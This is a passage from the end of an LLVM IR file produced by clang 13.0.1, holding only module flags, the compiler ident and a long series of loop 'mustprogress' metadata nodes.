attributes #16 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
!68 = distinct !{!68, !7}
!69 = distinct !{!69, !7}
!70 = distinct !{!70, !7}
!71 = distinct !{!71, !7}
!72 = distinct !{!72, !7}
!73 = distinct !{!73, !7}
